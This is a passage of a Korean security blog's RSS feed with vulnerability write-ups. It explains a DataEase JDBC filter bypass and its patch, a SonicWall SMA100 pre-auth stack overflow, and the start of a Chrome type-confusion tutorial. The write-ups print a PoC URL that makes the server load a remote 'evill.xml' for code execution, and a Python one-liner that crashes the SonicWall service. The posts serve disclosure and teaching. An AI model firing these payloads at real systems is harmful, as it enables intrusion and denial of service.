&#xBCC0;&#xC218;&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getJdbc</span><span class="hljs-params">()</span> </span>{        <span class="hljs-keyword">for</span> (String illegalParameter : illegalParameters) {            <span class="hljs-keyword">if</span> (jdbc.toUpperCase().contains(illegalParameter)) {                DEException.throwException(<span class="hljs-string">&quot;Has illegal parameter: &quot;</span> + jdbc);            }        }</code></pre><p>jdbc &#xBCC0;&#xC218;&#xC5D0; <code>socketFactory</code>, <code>socketFactoryArg</code> &#xB9E4;&#xAC1C;&#xBCC0;&#xC218;&#xAC00; &#xC874;&#xC7AC;&#xD558;&#xB294; &#xACBD;&#xC6B0;&#xC5D0;&#xB294; &#xAC10;&#xC9C0;&#xD558;&#xC5EC; &#xD544;&#xD130;&#xB9C1;&#xC774; &#xB429;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7EC;&#xB098; <code>sslfactory</code> &#xBC0F; <code>sslfactoryarg</code> &#xB9E4;&#xAC1C;&#xBCC0;&#xC218;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xACBD;&#xC6B0;&#xC5D0;&#xB294; &#xAC10;&#xC9C0;&#xAC00; &#xB418;&#xC9C0; &#xC54A;&#xAE30; &#xB54C;&#xBB38;&#xC5D0;, &#xC6B0;&#xD68C;&#xAC00; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p><p>PoC&#xB294; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">1.101</span>:<span class="hljs-number">5433</span><span class="hljs-regexp">/test/</span>?sslfactory=org.springframework.context.support.ClassPathXmlApplicationContext&amp;sslfactoryarg=http:<span class="hljs-regexp">//</span><span class="hljs-number">92.168</span>.<span class="hljs-number">1.101</span>:<span class="hljs-number">2333</span>/evill.xml&amp;</code></pre><p><img src="image1.png" alt="image1.png"></p><p>&#xD398;&#xC774;&#xC9C0; &#xB0B4;&#xC5D0;&#xC11C; &#xD638;&#xC2A4;&#xD2B8; &#xC774;&#xB984;/IP &#xC8FC;&#xC18C; &#xD544;&#xB4DC;&#xC5D0; PoC URL&#xC744; &#xC785;&#xB825;&#xD558;&#xC5EC; &#xBC1C;&#xC0DD;&#xC2DC;&#xD0B5;&#xB2C8;&#xB2E4;. URL&#xC5D0; &#xCDE8;&#xC57D;&#xD55C; &#xD30C;&#xB77C;&#xBBF8;&#xD130;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xBC29;&#xC2DD;&#xC73C;&#xB85C; &#xB3D9;&#xC791;&#xD569;&#xB2C8;&#xB2E4;. PoC&#xC5D0;&#xC11C;&#xB294; <code>sslfactoryarg</code> &#xD30C;&#xB77C;&#xBBF8;&#xD130;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xACE0; &#xC811;&#xADFC;&#xD560; &#xD30C;&#xC77C; &#xACBD;&#xB85C;&#xC5D0; &#xBBF8;&#xB9AC; &#xC900;&#xBE44;&#xD55C; <code>evill.xml</code> &#xD30C;&#xC77C;&#xC758; &#xACBD;&#xB85C;&#xB97C; &#xC0BD;&#xC785;&#xD558;&#xC5EC; &#xC804;&#xC1A1;&#xD569;&#xB2C8;&#xB2E4;.</p><p><img src="image2.png" alt="image2.png"></p><p>&#xC545;&#xC131; &#xD30C;&#xC77C;&#xC758; &#xAD6C;&#xC131;&#xC740; &#xC704;&#xC640; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="image3.png" alt="image3.png"></p><p>&#xC11C;&#xBC84; &#xCE21;&#xC5D0;&#xC11C; &#xD655;&#xC778;&#xD574;&#xBCF4;&#xBA74; &#xD398;&#xC774;&#xC9C0;&#xC5D0;&#xC11C; &#xC2A4;&#xD0A4;&#xB9C8;&#xB97C; &#xAC00;&#xC838;&#xC624;&#xB294; &#xB3D9;&#xC548; &#xB3D9;&#xC2DC;&#xC5D0; <code>evill.xml</code> &#xD30C;&#xC77C;&#xC5D0; &#xC811;&#xADFC;&#xC744; &#xD558;&#xB294; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xCC98;&#xB7FC; &#xC0AC;&#xC6A9;&#xC790; &#xC785;&#xB825; &#xAC12;&#xC774;&#xB098; &#xD30C;&#xC77C;&#xC5D0; &#xC811;&#xADFC;&#xD558;&#xC5EC; &#xC2E4;&#xD589;&#xC774; &#xAC00;&#xB2A5;&#xD558;&#xACE0;, &#xC774;&#xB85C; &#xC778;&#xD574; RCE &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC774; &#xCDE8;&#xC57D;&#xC810;&#xC740; 2.10.11 &#xBC84;&#xC804;&#xC5D0; <code>replace</code> &#xAD6C;&#xBB38;&#xC744; &#xCD94;&#xAC00;&#xD558;&#xB294; &#xAC83;&#xC73C;&#xB85C; &#xD328;&#xCE58; &#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getJdbc</span><span class="hljs-params">()</span> </span>{        <span class="hljs-keyword">for</span> (String illegalParameter : illegalParameters) {            <span class="hljs-keyword">if</span> (jdbc.toUpperCase().replace(<span class="hljs-string">&quot;\\&quot;</span>, <span class="hljs-string">&quot;&quot;</span>).contains(illegalParameter)) {                DEException.throwException(<span class="hljs-string">&quot;Has illegal parameter: &quot;</span> + jdbc);            }        }</code></pre><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-53004">https://nvd.nist.gov/vuln/detail/CVE-2025-53004</a></li><li><a href="https://github.com/dataease/dataease/commit/dd35752f298b1a4079d9993b622220d321b0c8a6">https://github.com/dataease/dataease/commit/dd35752f298b1a4079d9993b622220d321b0c8a6</a></li></ul>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/newp1ayer48/">newp1ayer48</category>
      
      <category domain="https://hackyboiz.github.io/tags/DataEase/">DataEase</category>
      
      <category domain="https://hackyboiz.github.io/tags/Parameters-Bypass/">Parameters Bypass</category>
      
      
      <comments>https://hackyboiz.github.io/2025/08/06/newp1ayer48/CVE-2025-53004/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2025-40596 : (Pre-auth) SonicWall SMA100의 스택 버퍼 오버플로우로 인한 DoS</title>
      <link>https://hackyboiz.github.io/2025/07/30/OUYA77/2025-07-30/</link>
      <guid>https://hackyboiz.github.io/2025/07/30/OUYA77/2025-07-30/</guid>
      <pubDate>Wed, 30 Jul 2025 05:20:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://labs.watchtowr.com/stack-overflows-heap-overflows</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://labs.watchtowr.com/stack-overflows-heap-overflows-and-existential-dread-sonicwall-sma100-cve-2025-40596-cve-2025-40597-and-cve-2025-40598/">https://labs.watchtowr.com/stack-overflows-heap-overflows-and-existential-dread-sonicwall-sma100-cve-2025-40596-cve-2025-40597-and-cve-2025-40598/</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>SonicWall SMA100 &#xD38C;&#xC6E8;&#xC5B4; &#xBC84;&#xC804; 10.2.1.15</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><h3 id="Background"><a href="#Background" class="headerlink" title="Background"></a>Background</h3><p>WatchTowr Labs&#xAC00; SonicWall SMA100 &#xC2DC;&#xB9AC;&#xC988;&#xC5D0;&#xC11C; &#xBC1C;&#xACAC;&#xD55C; &#xC138; &#xAC00;&#xC9C0; &#xCDE8;&#xC57D;&#xC810; &#xC911; &#xD558;&#xB098;&#xC778; CVE-2025-40596&#xC740; &#xC0AC;&#xC804; &#xC778;&#xC99D;(pre-auth) &#xC0C1;&#xD0DC;&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD558;&#xB294; &#xC2A4;&#xD0DD; &#xAE30;&#xBC18; &#xBC84;&#xD37C; &#xC624;&#xBC84;&#xD50C;&#xB85C;&#xC6B0; &#xCDE8;&#xC57D;&#xC810;&#xC785;&#xB2C8;&#xB2E4;. </p><p><code>httpd</code> &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xC5D0;&#xB294; &#xB4E4;&#xC5B4;&#xC624;&#xB294; &#xC694;&#xCCAD;&#xC744; &#xD2B9;&#xC815; &#xAE30;&#xB2A5;&#xC5D0; &#xC5F0;&#xACB0;&#xD558;&#xAE30; &#xC704;&#xD55C; &#xC77C;&#xB828;&#xC758; &#xC870;&#xAC74;&#xBD80; &#xAC80;&#xC0AC;&#xAC00; &#xD3EC;&#xD568;&#xB418;&#xC5B4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB9CC;&#xC57D; &#xC694;&#xCCAD; URI&#xAC00; <code>/__api__/</code>&#xB85C; &#xC2DC;&#xC791;&#xD558;&#xBA74;, &#xB2E4;&#xC74C; &#xB85C;&#xC9C1;&#xC774; &#xD2B8;&#xB9AC;&#xAC70;&#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xBA3C;&#xC800;, &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xB294; &#xB4E4;&#xC5B4;&#xC624;&#xB294; URI&#xC640; <code>/__api__/</code> &#xBB38;&#xC790;&#xC5F4; &#xAC04;&#xC5D0; <code>strncasecmp</code> &#xBE44;&#xAD50;&#xB97C; &#xC218;&#xD589;&#xD569;&#xB2C8;&#xB2E4;.</p><p><img src="image.png" alt="image.png"></p><p>&#xC694;&#xCCAD;&#xB41C; URI&#xC758; &#xCCAB; 9&#xBC14;&#xC774;&#xD2B8;&#xAC00; <code>/__api__/</code>&#xB85C; &#xC2DC;&#xC791;&#xD558;&#xBA74;, &#xC2E4;&#xD589;&#xC740; <code>loc_444F0</code> &#xBE14;&#xB85D;&#xC73C;&#xB85C; &#xC774;&#xB3D9;&#xD569;&#xB2C8;&#xB2E4;. </p><h3 id="root-cause"><a href="#root-cause" class="headerlink" title="root cause"></a>root cause</h3><p><code>loc_444F0</code> &#xBE14;&#xB85D; &#xB0B4;&#xBD80;&#xC5D0;&#xC11C;&#xB294; &#xC0AC;&#xC6A9;&#xC790; &#xC785;&#xB825;&#xC744; &#xD30C;&#xC2F1;&#xD558;&#xAE30; &#xC704;&#xD574; sscanf &#xD568;&#xC218;&#xAC00; &#xC0AC;&#xC6A9;&#xB429;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs jsx">int sscanf(<span class="hljs-keyword">const</span> char *str, <span class="hljs-keyword">const</span> char *format, ...);</code></pre><p>&#xC774; &#xD568;&#xC218;&#xB294; str&#xB85C;&#xBD80;&#xD130; &#xB370;&#xC774;&#xD130;&#xB97C; format&#xC5D0; &#xB530;&#xB77C; &#xC77D;&#xC5B4;&#xC640; &#xC9C0;&#xC815;&#xB41C; &#xBCC0;&#xC218;&#xC5D0; &#xC800;&#xC7A5;&#xD558;&#xB294; &#xC5ED;&#xD560;&#xC744; &#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xBB38;&#xC81C;&#xB294; <code>sscanf</code> &#xD568;&#xC218;&#xAC00; &#xC0AC;&#xC6A9;&#xC790; &#xC81C;&#xACF5; URI, <code>https://x.x.x.x/__api__/v1/login</code>&#xACFC; &#xAC19;&#xC740; &#xD615;&#xC2DD;&#xC5D0;&#xC11C; &#xB9C8;&#xC9C0;&#xB9C9; &#xC2AC;&#xB798;&#xC2DC;(<code>/</code>) &#xB4A4;&#xC758; &#xBAA8;&#xB4E0; &#xBB38;&#xC790;&#xB97C; 0x800 &#xBC14;&#xC774;&#xD2B8; &#xD06C;&#xAE30;&#xC758; &#xC2A4;&#xD0DD; &#xBC84;&#xD37C;&#xB85C; &#xBCF5;&#xC0AC;&#xD560; &#xB54C; <strong>&#xC785;&#xB825; &#xAE38;&#xC774; &#xC81C;&#xD55C;&#xC5D0; &#xB300;&#xD55C; &#xACBD;&#xACC4; &#xAC80;&#xC0AC; &#xC5C6;&#xC774; &#xBCF5;&#xC0AC;&#xAC00; &#xC774;&#xB8E8;&#xC5B4;&#xC9C4;&#xB2E4;</strong>&#xB294; &#xAC83;&#xC785;&#xB2C8;&#xB2E4;. &#xAD6C;&#xCCB4;&#xC801;&#xC73C;&#xB85C;, URI&#xC758; &#xB9C8;&#xC9C0;&#xB9C9; &#xC2AC;&#xB798;&#xC2DC; &#xB4A4;&#xC758; &#xBB38;&#xC790;&#xB4E4;&#xC774; <code>rcx</code> &#xB808;&#xC9C0;&#xC2A4;&#xD130;&#xC5D0; &#xC800;&#xC7A5;&#xB41C; &#xBA54;&#xBAA8;&#xB9AC; &#xC8FC;&#xC18C;(&#xC774;&#xB294; <code>[rsp+898h+var_878]</code>&#xC5D0; &#xC704;&#xCE58;&#xD55C; &#xC2A4;&#xD0DD; &#xBCC0;&#xC218;&#xC5D0;&#xC11C; &#xD30C;&#xC0DD;&#xB428;)&#xB85C; &#xBCF5;&#xC0AC;&#xB418;&#xB294;&#xB370;, &#xC774;&#xB54C; &#xC785;&#xB825; &#xAE38;&#xC774; &#xC81C;&#xD55C;&#xC774; &#xC5C6;&#xC5B4; &#xC2A4;&#xD0DD; &#xBC84;&#xD37C; &#xC624;&#xBC84;&#xD50C;&#xB85C;&#xC6B0;&#xAC00; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;.</p><p><img src="image%201.png" alt="image.png"></p><h3 id="PoC-&#xC124;&#xBA85;"><a href="#PoC-&#xC124;&#xBA85;" class="headerlink" title="PoC &#xC124;&#xBA85;"></a><strong>PoC &#xC124;&#xBA85;</strong></h3><p>&#xC774; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xC7AC;&#xD604;&#xD558;&#xB294; &#xAC83;&#xC740; &#xB9E4;&#xC6B0; &#xAC04;&#xB2E8;&#xD569;&#xB2C8;&#xB2E4;. &#xAE34; URI &#xBB38;&#xC790;&#xC5F4;&#xC744; &#xD3EC;&#xD568;&#xD558;&#xB294; HTTP GET &#xC694;&#xCCAD;&#xC744; &#xC804;&#xC1A1;&#xD558;&#xC5EC; &#xD2B8;&#xB9AC;&#xAC70;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC608;&#xB97C; &#xB4E4;&#xC5B4;, &#xB2E4;&#xC74C; &#xD30C;&#xC774;&#xC36C; &#xCF54;&#xB4DC;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xBA74; &#xCDE8;&#xC57D;&#xD55C; &#xC11C;&#xBC84;&#xC5D0;&#xC11C; &#xC5F0;&#xACB0;&#xC774; &#xB04A;&#xAE30;&#xB294; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;:</p><p><code>import requests; requests.get(&quot;https://x.x.x.x/__api__/v1/&quot;+&apos;A&apos;*3000,verify=False)</code></p><p>&#xC774; &#xCF54;&#xB4DC;&#xB294; <code>/__api__/v1/</code> &#xB4A4;&#xC5D0; &#x2018;A&#x2019; &#xBB38;&#xC790; 3000&#xAC1C;&#xB97C; &#xCD94;&#xAC00;&#xD558;&#xC5EC; &#xC804;&#xC1A1;&#xD558;&#xBA70;, &#xC774;&#xB294; 0x800 &#xBC14;&#xC774;&#xD2B8; &#xC2A4;&#xD0DD; &#xBC84;&#xD37C;&#xB97C; &#xC624;&#xBC84;&#xD50C;&#xB85C;&#xC6B0;&#xC2DC;&#xCF1C; &#xC11C;&#xBE44;&#xC2A4; &#xAC70;&#xBD80;(DoS)&#xB97C; &#xC720;&#xBC1C;&#xD569;&#xB2C8;&#xB2E4;. &#xB354; &#xC9E7;&#xC740; &#xD398;&#xC774;&#xB85C;&#xB4DC;(e.g., 2000&#xBC14;&#xC774;&#xD2B8;)&#xB97C; &#xC804;&#xC1A1;&#xD558;&#xBA74; &#xC11C;&#xBC84;&#xAC00; &#x2018;400 Bad Request&#x2019;&#xB85C; &#xC751;&#xB2F5;&#xD558;&#xB294; &#xAC83;&#xC744; &#xBCFC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p>gdb &#xD658;&#xACBD;&#xC5D0;&#xC11C; &#xC774;&#xB97C; &#xAD00;&#xCC30;&#xD558;&#xBA74; &#xC2A4;&#xD0DD; &#xCE74;&#xB098;&#xB9AC;&#xC640; &#xBC18;&#xD658; &#xC8FC;&#xC18C;&#xAC00; &#xC624;&#xBC84;&#xD50C;&#xB85C;&#xC6B0;&#xB85C; &#xC778;&#xD574; &#xB36E;&#xC5B4;&#xC4F0;&#xC5EC;&#xC9C0;&#xB294; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="https://labs.watchtowr.com/content/images/2025/07/image-37.png" alt></p><p> <code>/usr/src/EasyAccess/bin/httpd</code> &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xC5D0; &#xC2A4;&#xD0DD; &#xBCF4;&#xD638;&#xAC00; &#xD65C;&#xC131;&#xD654;&#xB418;&#xC5B4; &#xC788;&#xC5B4; &#xC9C1;&#xC811;&#xC801;&#xC778; &#xC6D0;&#xACA9; &#xCF54;&#xB4DC; &#xC2E4;&#xD589;&#xC740; &#xB2E4;&#xC18C; &#xC5B4;&#xB835;&#xC9C0;&#xB9CC;, &#xC0AC;&#xC804; &#xC778;&#xC99D; &#xACBD;&#xB85C;&#xC5D0;&#xC11C; &#xC2A4;&#xD0DD; &#xAE30;&#xBC18; &#xBC84;&#xD37C; &#xC624;&#xBC84;&#xD50C;&#xB85C;&#xC6B0;&#xAC00; &#xBC1C;&#xC0DD;&#xD55C;&#xB2E4;&#xB294; &#xC0AC;&#xC2E4; &#xC790;&#xCCB4;&#xAC00; &#xBB38;&#xC81C;&#xC785;&#xB2C8;&#xB2E4;.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/OUYA77/">OUYA77</category>
      
      <category domain="https://hackyboiz.github.io/tags/SonicWall/">SonicWall</category>
      
      <category domain="https://hackyboiz.github.io/tags/SMA100/">SMA100</category>
      
      <category domain="https://hackyboiz.github.io/tags/Stack-Buffer-Overflow/">Stack Buffer Overflow</category>
      
      
      <comments>https://hackyboiz.github.io/2025/07/30/OUYA77/2025-07-30/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] Type Confusion 101으로 시작하는 Chrome Exploit ^-^☆Part 2.(KR)</title>
      <link>https://hackyboiz.github.io/2025/07/30/OUYA77/Chrome_part2/kr/</link>
      <guid>https://hackyboiz.github.io/2025/07/30/OUYA77/Chrome_part2/kr/</guid>
      <pubDate>Wed, 30 Jul 2025 05:20:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;&amp;#xC548;&amp;#xB155;&amp;#xD558;&amp;#xC138;&amp;#xC694; OUYA77 &amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;. 2025&amp;#xB144;&amp;#xB3C4; &amp;#xBC8C;&amp;#xC368; &amp;#xBC18;&amp;#xC774;&amp;#xB098; </description>
        
      
      
      
      <content:encoded><![CDATA[<p>&#xC548;&#xB155;&#xD558;&#xC138;&#xC694; OUYA77 &#xC785;&#xB2C8;&#xB2E4;. 2025&#xB144;&#xB3C4; &#xBC8C;&#xC368; &#xBC18;&#xC774;&#xB098; &#xC9C0;&#xB0AC;&#xB294;&#xB370;, &#xAC8C;&#xB2E4;&#xAC00; 7&#xC6D4;&#xB3C4; &#xB2E4;&#xC9C0;&#xB098;&#xAC14;&#xB124;&#xC694;. &#xC2DC;&#xAC04; &#xCC38; &#xBE60;&#xB974;&#xB124;&#xC694;. &#xC5EC;&#xB7EC;&#xBD84;&#xB3C4; &#xADF8;&#xB807;&#xAC8C; &#xC0DD;&#xAC01;&#xD558;&#xC2DC;&#xB098;&#xC694;? &#x314E;.&#x314E;</p><p>&#xC774;&#xBC88; &#xD30C;&#xD2B8;&#xC5D0;&#xC11C;&#xB294; &#xD06C;&#xB86C; &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787; &#xCC0D;&#xBA39;&#xC815;&#xB3C4;&#xB294; &#xD574;&#xBCF4;&#xACE0; &#xC2F6;&#xC5C8;&#xB294;&#xB370;, &#xC544;&#xBB34;&#xB798;&#xB3C4; &#xD06C;&#xB86C;&#xC774;&#xB77C;&#xB294; &#xD504;&#xB85C;&#xADF8;&#xB7A8; &#xC790;&#xCCB4;&#xAC00; &#xBCF5;&#xC7A1;&#xD558;&#xACE0; &#xC54C;&#xC544;&#xC57C; &#xD560; background &#xB0B4;&#xC6A9;&#xC774; &#xC880; &#xC788;&#xC5B4;&#xC11C; &#xAE00;&#xC774; &#xAE38;&#xC5B4;&#xC84C;&#xB124;&#xC694;. &#xC774;&#xBC88; &#xD30C;&#xD2B8;&#xC5D0;&#xC11C;&#xB294; &#xAE30;&#xBCF8;&#xC801;&#xC778; Type Confusion&#xACFC; Chrome&#xC5D0;&#xC11C;&#xC758; Type Confusion&#xC744; &#xBE44;&#xAD50;&#xD574;&#xBCF4;&#xACE0; &#xC774; Type Confusion &#xC774; &#xC5B4;&#xB5BB;&#xAC8C; &#xBC1C;&#xC0DD;&#xD558;&#xACE0; &#xACB0;&#xAD6D; Memory Corruption&#xC774; &#xC5B4;&#xB5BB;&#xAC8C; &#xBC1C;&#xC0DD;&#xD558;&#xB294;&#xC9C0; &#xC54C;&#xC544;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xADF8;&#xB7FC; &#xBCF8;&#xACA9;&#xC801;&#xC73C;&#xB85C; &#xB4E4;&#xC5B4;&#xAC00;&#xAE30; &#xC804;&#xC5D0; &#xC9C0;&#xB09C; &#xC2DC;&#xAC04; &#xB0B4;&#xC6A9;&#xC744; &#xAC04;&#xB2E8;&#xD788; &#xC0B4;&#xD3B4;&#xBCF4;&#xACE0; &#xAC00;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h2 id="0-Part-1-Recap"><a href="#0-Part-1-Recap" class="headerlink" title="0. Part 1. Recap"></a>0. Part 1. Recap</h2><p>&#xC9C0;&#xB09C; &#xC2DC;&#xAC04;&#xC5D0;&#xB294; Chrome &#xC804;&#xCCB4; &#xC544;&#xD0A4;&#xD14D;&#xCCD0;&#xB97C; &#xC0B4;&#xD3B4;&#xBCF4;&#xBA70; &#xD504;&#xB860;&#xD2B8;&#xC5D4;&#xB4DC; &#xB9AC;&#xC18C;&#xC2A4;&#xAC00; &#xC5B4;&#xB5BB;&#xAC8C; &#xCC98;&#xB9AC;&#xB418;&#xB294;&#xC9C0; &#xBCF4;&#xC558;&#xC5B4;&#xC694;. &#xC870;&#xAE08; &#xB354; &#xC790;&#xC138;&#xD788; &#xC774;&#xC57C;&#xAE30;&#xD558;&#xC790;&#xBA74;, HTML, CSS, JS &#xD30C;&#xC77C;&#xC774; &#xD06C;&#xB86C;&#xC5D0;&#xC11C; &#xB80C;&#xB354;&#xB9C1;&#xB418;&#xB294; &#xACFC;&#xC815;&#xC5D0; &#xB300;&#xD574; &#xC0B4;&#xD3B4;&#xBCF4;&#xC558;&#xB294;&#xB370; &#xC774;&#xBC88; &#xC5F0;&#xAD6C;&#xAE00;&#xC5D0;&#xC11C;&#xB294; &#xADF8; &#xC911; JS &#xD30C;&#xC77C;&#xC744; &#xCC98;&#xB9AC;&#xD558;&#xB294; V8&#xC5D0; &#xB300;&#xD574;&#xC11C; &#xC0B4;&#xD3B4;&#xBCF4;&#xB824;&#xACE0; &#xD569;&#xB2C8;&#xB2E4;.</p><blockquote><p>&#xC548;&#xBCF4;&#xC168;&#xB2E4;&#xBA74; &#x2192; <a href="https://hackyboiz.github.io/2025/07/01/OUYA77/Chrome_part1/kr/">[Research] Type Confusion 101&#xC73C;&#xB85C; &#xC2DC;&#xC791;&#xD558;&#xB294; Chrome Exploit ^-^&#x2606; Part 1.</a></p></blockquote><p><img src="image%201.png" alt="image.png"></p><p>V8&#xC740; &#xBE60;&#xB974;&#xACE0; &#xD6A8;&#xC728;&#xC801;&#xC778; JavaScript &#xC2E4;&#xD589;&#xC744; &#xC704;&#xD574; &#xB2E4;&#xC591;&#xD55C; &#xCEF4;&#xD30C;&#xC77C;&#xB7EC; &#xACC4;&#xCE35;(Ignition, SparkPlug, Maglev, TurboFan)&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xB294;&#xB370;, &#xC774; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xCF54;&#xB4DC;&#xB97C; &#xC810;&#xC810; &#xB354; &#xCD5C;&#xC801;&#xD654;&#xD558;&#xBA74;&#xC11C; &#xC2E4;&#xD589; &#xC18D;&#xB3C4;&#xB97C; &#xB192;&#xC785;&#xB2C8;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC; &#xC774; &#xCD5C;&#xC801;&#xD654;&#xB294; &#x201C;&#xD56D;&#xC0C1; &#xC774; &#xAD6C;&#xC870;&#xC77C; &#xAC83;&#xC774;&#xB2E4;&#x201D;&#xB77C;&#xB294; &#xAC00;&#xC815;&#xC5D0; &#xAE30;&#xBC18;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0;, &#xB9CC;&#xC57D; &#xACF5;&#xACA9;&#xC790;&#xAC00; &#xD2B9;&#xC815; &#xC2DC;&#xC810;&#xC5D0; &#xAC1D;&#xCCB4; &#xD0C0;&#xC785;&#xC774;&#xB098; &#xAD6C;&#xC870;&#xB97C; &#xBC14;&#xAFD4;&#xBC84;&#xB9B0;&#xB2E4;&#xBA74;, V8&#xC740; &#xC798;&#xBABB;&#xB41C; &#xAC00;&#xC815; &#xD558;&#xC5D0; &#xC798;&#xBABB;&#xB41C; &#xB124;&#xC774;&#xD2F0;&#xBE0C; &#xCF54;&#xB4DC;&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;. &#xC774;&#xAC83;&#xC774; &#xBC14;&#xB85C; <strong>Type Confusion</strong>&#xC774; &#xBC1C;&#xC0DD;&#xD558;&#xB294; &#xB300;&#xD45C;&#xC801;&#xC778; &#xC2DC;&#xB098;&#xB9AC;&#xC624;&#xC785;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xC81C; V8 &#xB0B4;&#xBD80;&#xC5D0;&#xC11C; &#xCF54;&#xB4DC;&#xAC00; &#xC5B4;&#xB5BB;&#xAC8C; &#xC2E4;&#xD589;&#xB418;&#xB294;&#xC9C0; &#xAE30;&#xBCF8; &#xAD6C;&#xC870;&#xB97C; &#xC774;&#xD574;&#xD588;&#xC73C;&#xB2C8;, &#xB2E4;&#xC74C; &#xB2E8;&#xACC4;&#xC5D0;&#xC11C;&#xB294; &#xC774; &#xC5D4;&#xC9C4; &#xB0B4;&#xBD80;&#xC5D0;&#xC11C; &#xAC1D;&#xCCB4;&#xAC00; &#xC5B4;&#xB5BB;&#xAC8C; &#xD45C;&#xD604;&#xB418;&#xACE0;, &#xCD5C;&#xC801;&#xD654;&#xB418;&#xBA70;, &#xB098;&#xC544;&#xAC00; &#xC774; &#xAD6C;&#xC870;&#xAC00; &#xC5B4;&#xB5BB;&#xAC8C; <strong>Type Confusion</strong>&#xACFC; &#xAC19;&#xC740; &#xBCF4;&#xC548; &#xC774;&#xC288;&#xB85C; &#xC774;&#xC5B4;&#xC9C8; &#xC218; &#xC788;&#xB294;&#xC9C0;&#xB97C; &#xC54C;&#xC544;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;!</p><h2 id="1-Type-Confusion-101"><a href="#1-Type-Confusion-101" class="headerlink" title="1. Type Confusion 101"></a>1. Type Confusion 101</h2><h3 id="1-1-Introduction"><a href="#1-1-Introduction" class="headerlink" title="1.1 Introduction"></a>1.1 Introduction</h3><p>Type Confusion&#xC740; &#xB9D0;&#xADF8;&#xB300;&#xB85C; <code>Type</code>&#xC774; <code>Confusion</code> &#xB418;&#xC5C8;&#xAE30;&#xC5D0; &#xBC1C;&#xC0DD;&#xD558;&#xB294; &#xCDE8;&#xC57D;&#xC810;&#xC785;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7FC; &#xC5EC;&#xAE30;&#xC11C; &#xB9D0;&#xD558;&#xB294; &#xD0C0;&#xC785;(Type)&#xC774;&#xB780; &#xBB34;&#xC5C7;&#xC77C;&#xAE4C;&#xC694;? &#xCEF4;&#xD4E8;&#xD130;&#xC5D0;&#xC11C; &#x2018;&#xD0C0;&#xC785;&#x2019;&#xC774;&#xB780; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC800;&#xC7A5;&#xD558;&#xACE0; &#xCC98;&#xB9AC;&#xD558;&#xB294; &#xBC29;&#xC2DD;&#xC744; 